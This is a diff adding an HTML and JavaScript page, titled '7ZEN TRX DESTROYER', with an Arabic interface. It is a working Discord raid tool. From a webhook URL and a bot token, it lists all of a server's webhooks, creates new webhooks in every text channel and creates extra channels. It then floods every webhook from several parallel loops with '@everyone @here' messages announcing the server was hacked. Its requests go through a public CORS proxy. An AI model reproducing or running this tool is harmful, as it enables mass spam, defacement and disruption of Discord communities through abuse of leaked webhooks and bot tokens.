@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>☣️ 7ZEN ☣️ · TRX DESTROYER</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+.box{background:#111;border:1px solid #2a2a2a;border-radius:30px;padding:40px;width:620px;max-width:100%;text-align:center}
+h1{color:#ff1a1a;letter-spacing:5px;margin:0 0 5px;font-size:42px}
+.sub{color:#555;font-size:12px;margin:0 0 20px;letter-spacing:3px}
+input,textarea{width:100%;padding:12px 18px;background:#1a1a1a;border:1px solid #333;border-radius:30px;color:#fff;font-size:13px;outline:none;font-family:inherit;margin-bottom:8px;direction:ltr;text-align:left}
+input:focus{border-color:#ff1a1a}
+textarea{border-radius:16px;height:150px;margin-top:10px;background:#050505;color:#00ff88;font-family:'Courier New',monospace;font-size:11px;resize:none;overflow-y:auto}
+.row{display:flex;gap:8px;margin:5px 0;flex-wrap:wrap}
+.row>*{flex:1;min-width:100px}
+.btn{padding:12px 16px;border:none;border-radius:30px;font-size:14px;font-weight:700;cursor:pointer;letter-spacing:2px;transition:.2s}
+.btn:hover:not(:disabled){transform:scale(1.02)}
+.btn:disabled{opacity:.3;cursor:not-allowed}
+.r{background:#cc0000;color:#fff}
+.r:hover:not(:disabled){background:#ff1a1a}
+.g{background:#006600;color:#fff}
+.g:hover:not(:disabled){background:#009900}
+.b{background:#003366;color:#fff}
+.b:hover:not(:disabled){background:#0055aa}
+.d{background:#222;color:#888;border:1px solid #444}
+.d:hover:not(:disabled){background:#cc0000;color:#fff;border-color:#cc0000}
+.p{background:#4a0033;color:#fff}
+.p:hover:not(:disabled){background:#660044}
+.sec{background:#0d0d0d;border:1px solid #222;border-radius:20px;padding:18px;margin:12px 0;text-align:left}
+.st{color:#888;font-size:13px;margin:3px 0}
+#cnt{color:#00ff88;font-size:28px;font-weight:700}
+.wi{display:flex;gap:6px;align-items:center;margin-bottom:6px}
+.wi input{flex:1;margin-bottom:0}
+.wi button{background:#660000;color:#fff;border:none;border-radius:30px;padding:12px 16px;cursor:pointer;font-size:16px}
+.wi button:hover{background:#990000}
+.gr{display:grid;grid-template-columns:1fr 1fr;gap:5px}
+.it{background:#0a0a0a;padding:8px 12px;border-radius:12px;border:1px solid #1a1a1a}
+.lb{color:#555;font-size:10px;letter-spacing:1px}
+.vl{color:#fff;font-size:13px;word-break:break-all}
+.note{color:#886600;font-size:11px;padding:8px 12px;background:#1a1100;border-radius:12px;margin:5px 0;border:1px solid #332200}
+.grn{color:#008866;background:#001a11;border-color:#003322}
+.cb{display:flex;align-items:center;gap:10px;margin:5px 0}
+.cb input{width:auto;margin:0}
+.cb label{font-size:13px;color:#888}
+.sm{padding:8px 14px;font-size:12px}
+.bg{color:#ff1a1a;font-size:11px;margin-top:10px;letter-spacing:2px;opacity:.6}
+#is{display:none}
+.wh-count{color:#00ff88;font-size:12px;margin-top:5px}
+</style>
+</head>
+<body>
+<div class="box">
+<h1>☢️ 7ZEN ☢️</h1>
+<p class="sub">● فحص · سبام · جميع القنوات · ويبهوكات ●</p>
+<div class="row">
+<input type="text" id="wh" placeholder="https://discord.com/api/webhooks/..." style="flex:3">
+<button class="btn b" id="sc" onclick="SCAN()" style="flex:1">🔍فحص</button>
+</div>
+<div class="sec" id="is">
+<div class="st" style="color:#ff1a1a;font-size:13px;letter-spacing:2px;margin-bottom:10px">📋 معلومات السيرفر</div>
+<div class="gr">
+<div class="it"><div class="lb">السيرفر</div><div class="vl" id="gn">-</div></div>
+<div class="it"><div class="lb">ID السيرفر</div><div class="vl" id="gi">-</div></div>
+<div class="it"><div class="lb">القناة</div><div class="vl" id="cn">-</div></div>
+<div class="it"><div class="lb">ID القناة</div><div class="vl" id="ci">-</div></div>
+<div class="it"><div class="lb">الويبهوك</div><div class="vl" id="wn">-</div></div>
+<div class="it"><div class="lb">ID الويبهوك</div><div class="vl" id="wii">-</div></div>
+</div>
+<div id="ow" style="margin-top:10px"></div>
+</div>
+<div class="sec">
+<div class="st" style="color:#ff1a1a;font-size:13px;letter-spacing:2px;margin-bottom:10px">🤖 بوت توكين</div>
+<input type="text" id="bt" placeholder="ODIzNTI4MDAxMjM0NTY3ODkw.GHkLmN.xx">
+<div class="row">
+<input type="text" id="px" class="sm" value="https://api.allorigins.win/raw?url=" style="flex:3">
+<span style="flex:1;font-size:11px;color:#666;display:flex;align-items:center">بروكسي</span>
+</div>
+</div>
+<div class="sec">
+<div class="st" style="color:#ff1a1a;font-size:13px;letter-spacing:2px;margin-bottom:10px">🔗 جميع الويبهوكات <span id="whc" class="wh-count">(0)</span></div>
+<div id="wl">
+<div class="wi">
+<input type="text" class="wu" placeholder="https://discord.com/api/webhooks/...">
+<button onclick="RM(this)">✕</button>
+</div>
+</div>
+<div class="row" style="margin-top:8px">
+<button class="btn d" onclick="AD()" style="flex:1">➕ إضافة</button>
+<button class="btn p" id="fwb" onclick="FIND_ALL()" style="flex:1">🔎 جلب الكل</button>
+<button class="btn g" onclick="ALL_CH()" style="flex:1">📡 كل القنوات</button>
+</div>
+</div>
+<div class="row" style="margin:10px 0">
+<button class="btn g" id="cwb" onclick="CW()">🆕إنشاء</button>
+<button class="btn r" id="go" onclick="GO()">💀ابدأ</button>
+<button class="btn d" id="st" onclick="STOP()" disabled>⛔إيقاف</button>
+</div>
+<div class="st">الرسائل:</div>
+<div id="cnt">0</div>
+<textarea id="log" readonly></textarea>
+<div class="bg">● ☣️ 7ZEN ☣️ · امن سبراني ☣️ ●</div>
+</div>
+<script>
+let R=false,S=false,N=0,TM=[],CH=[],WH=null,WHs=[];
+const AV='https://i.ibb.co/tkT3Lb6/F35-FD059-0-CD2-485-E-ABDF-11-B2-C814-C78-F.png';
+const UN=' ☣️ 7zen ☣️';
+const $=i=>document.getElementById(i);
+const L=m=>{const e=$('log');e.value+=`[${new Date().toLocaleTimeString('ar-SA')}] ${m}\n`;e.scrollTop=e.scrollHeight};
+const QC=()=>{const q=document.querySelectorAll('.wu');let c=0;for(const e of q)if(e.value.trim())c++;$('whc').textContent=`(${c})`};
+
+async function SCAN(){
+const u=$('wh').value.trim();
+if(!u){alert('حط رابط');return}
+const m=u.match(/discord\.com\/api\/webhooks\/(\d+)\/([A-Za-z0-9_-]+)/);
+if(!m){L('❌ رابط غير صالح');return}
+const id=m[1],tk=m[2];L('🔍 جاري الفحص...');
+try{
+const r=await fetch(`https://discord.com/api/webhooks/${id}/${tk}`,{method:'GET',headers:{'Content-Type':'application/json'}});
+if(!r.ok){L(`⚠️ CORS (${r.status})`);$('gi').textContent=id;$('wii').textContent=id;$('is').style.display='block';return}
+const d=await r.json();WH=d;
+$('gn').textContent=d.name||'-';$('gi').textContent=d.guild_id||'-';$('cn').textContent='-';$('ci').textContent=d.channel_id||'-';$('wn').textContent=d.name||'-';$('wii').textContent=d.id||id;
+$('is').style.display='block';
+$('ow').innerHTML='<div class="note grn">✅ اضغط "جلب الكل" لسحب جميع ويبهوكات السيرفر</div>';
+const q=document.querySelectorAll('.wu');let f=false;
+for(const e of q){if(e.value.trim()===u){f=true;break}}
+if(!f){const q2=document.querySelector('.wu');if(q2&&!q2.value.trim())q2.value=u;else ADW(u)}
+L(`✅ ${d.name||'OK'}`);QC();
+}catch(e){L(`❌ ${e.message}`)}
+}
+
+function AD(){const l=$('wl'),d=document.createElement('div');d.className='wi';d.innerHTML='<input type="text" class="wu" placeholder="https://discord.com/api/webhooks/..."><button onclick="RM(this)">✕</button>';l.appendChild(d)}
+function ADW(v){const l=$('wl'),d=document.createElement('div');d.className='wi';d.innerHTML=`<input type="text" class="wu" value="${v}" placeholder="https://discord.com/api/webhooks/..."><button onclick="RM(this)">✕</button>`;l.appendChild(d);QC()}
+function RM(b){const q=document.querySelectorAll('.wi');if(q.length<=1){L('⚠️ لازم واحد');return}b.parentElement.remove();QC()}
+function GA(){const q=document.querySelectorAll('.wu'),u=[];for(const e of q){const v=e.value.trim();if(v)u.push(v)}return u}
+
+async function FIND_ALL(){
+const tk=$('bt').value.trim(),px=$('px').value.trim();
+if(!tk){alert('حط بوت توكين');return}
+if(!WH||!WH.guild_id){alert('اضغط فحص أول');return}
+const gid=WH.guild_id;L('🔎 جلب جميع ويبهوكات السيرفر...');
+try{
+const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/guilds/${gid}/webhooks`),{headers:{'Authorization':`Bot ${tk}`}});
+if(!r.ok){L(`❌ ${r.status}`);return}
+const data=await r.json();let c=0;
+for(const w of data){const wu=`https://discord.com/api/webhooks/${w.id}/${w.token}`;ADW(wu);c++}
+L(`✅ ${c} ويبهوك`);QC();
+}catch(e){L(`❌ ${e.message}`)}
+}
+
+async function ALL_CH(){
+const tk=$('bt').value.trim(),px=$('px').value.trim();
+if(!tk){alert('حط بوت توكين');return}
+if(!WH||!WH.guild_id){alert('اضغط فحص أول');return}
+const gid=WH.guild_id;L('📡 جلب جميع القنوات...');
+try{
+const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/guilds/${gid}/channels`),{headers:{'Authorization':`Bot ${tk}`}});
+if(!r.ok){L(`❌ ${r.status}`);return}
+const channels=await r.json();const txtCh=channels.filter(c=>c.type===0);let sc=0;
+L(`📡 إنشاء ويبهوك في ${txtCh.length} قناة...`);
+for(const ch of txtCh){
+if(S)break
+try{
+const r2=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/channels/${ch.id}/webhooks`),{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:'☣️ 7ZEN ☣️'})});
+if(r2.ok){const d=await r2.json();const wu=`https://discord.com/api/webhooks/${d.id}/${d.token}`;ADW(wu);sc++}
+}catch(e){}
+}
+L(`✅ ${sc} ويبهوك في كل القنوات`);QC();
+}catch(e){L(`❌ ${e.message}`)}
+}
+
+async function CW(){
+const u=$('wh').value.trim(),tk=$('bt').value.trim(),px=$('px').value.trim();
+if(!u){alert('حط رابط');return}
+if(!tk){alert('حط بوت توكين');return}
+const m=u.match(/discord\.com\/api\/webhooks\/(\d+)\/([A-Za-z0-9_-]+)/);
+if(!m){L('❌ رابط غير صالح');return}
+if(!WH||!WH.channel_id){L('❌ اضغط فحص أول');return}
+const cid=WH.channel_id;L('🆕 إنشاء ويبهوك...');
+try{
+const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/channels/${cid}/webhooks`),{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:'☣️ 7ZEN ☣️'})});
+if(r.ok){const d=await r.json();const wu=`https://discord.com/api/webhooks/${d.id}/${d.token}`;L('✅ تم');ADW(wu);$('wh').value=wu;QC()}
+else{const t=await r.text();L(`❌ ${r.status} ${t.slice(0,60)}`)}
+}catch(e){L(`❌ ${e.message}`)}
+}
+
+async function MKCH(){
+const tk=$('bt').value.trim(),px=$('px').value.trim();
+if(!tk){L('⚠️ مافي بوت');return false}
+if(!WH||!WH.guild_id){L('❌ اضغط فحص أول');return false}
+const gid=WH.guild_id;let sc=0;
+for(let i=0;i<5;i++){
+if(S)break;const nm=`☣️7zen☣️-${i+1}`;
+try{
+const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/guilds/${gid}/channels`),{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:nm,type:0})});
+if(r.ok){const d=await r.json();CH.push(d.id);sc++;L(`✅ #${nm}`)}
+else{break}
+}catch(e){break}
+}
+if(sc>0)L(`🔥 ${sc} روم 7ZEN`);return sc>0
+}
+
+async function RMCH(){
+const tk=$('bt').value.trim(),px=$('px').value.trim();
+if(CH.length===0)return
+if(!tk){L('⚠️ مافي بوت');return}
+L(`🗑️ حذف ${CH.length}...`);let d=0;
+for(const id of CH){
+if(S)break
+try{
+const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/channels/${id}`),{method:'DELETE',headers:{'Authorization':`Bot ${tk}`}});
+if(r.ok||r.status===404)d++
+}catch(e){}
+}
+L(`✅ حذف ${d}`);CH=[]
+}
+
+async function SM(wh,t){
+if(S)return
+try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:t,username:UN,avatar_url:AV})});N++;$('cnt').textContent=N}catch(e){}
+}
+async function SA(t){const u=GA();for(const w of u)SM(w,t)}
+
+function L1(t){if(S)return;for(let i=0;i<30;i++)SA(t);TM.push(setTimeout(()=>L1(t),70))}
+function L2(t){if(S)return;for(let i=0;i<25;i++)SA(t);TM.push(setTimeout(()=>L2(t),100))}
+function L3(t){if(S)return;for(let i=0;i<20;i++)SA(t);TM.push(setTimeout(()=>L3(t),130))}
+function L4(t){if(S)return;for(let i=0;i<35;i++)SA(t);TM.push(setTimeout(()=>L4(t),50))}
+
+async function GO(){
+const u=GA();if(u.length===0){alert('⚠️ أضف ويبهوك');return}
+if(R)return
+R=true;S=false;N=0;CH=[];TM=[]
+$('cnt').textContent='0';$('go').disabled=true;$('st').disabled=false;$('sc').disabled=true;$('cwb').disabled=true;$('fwb').disabled=true;$('log').value=''
+L('🚀 ☣️ 7ZEN ☣️ DESTROYER');L(`📌 ${u.length} ويبهوك`);L(`👤 ${UN}`)
+const msg='@everyone @here 7ZEN · تم التهكير من قبل · ☣️ 7zen ☣️ · النظام الامن السبراني · @here @everyone'
+L1(msg);L2(msg);L3(msg);L4(msg)
+const cb=document.querySelector('#wl input[type="checkbox"]');if(cb&&cb.checked||true){L('🏗️ رومات 7ZEN...');await MKCH()}
+TM.push(setInterval(()=>{if(S)return;L(`📊 ${N} رسالة | ${GA().length} ويبهوك`)},5000))
+}
+
+async function STOP(){
+if(!R)return
+L('⛔ إيقاف...');S=true
+for(const t of TM)clearTimeout(t);TM=[]
+if(CH.length>0){L('🗑️ حذف الرومات...');await RMCH()}
+setTimeout(()=>{R=false;$('go').disabled=false;$('st').disabled=true;$('sc').disabled=false;$('cwb').disabled=false;$('fwb').disabled=false;L(`🛑 ${N} رسالة`)},300)
+}
+</script>
+</div>
+</body>
+</html>
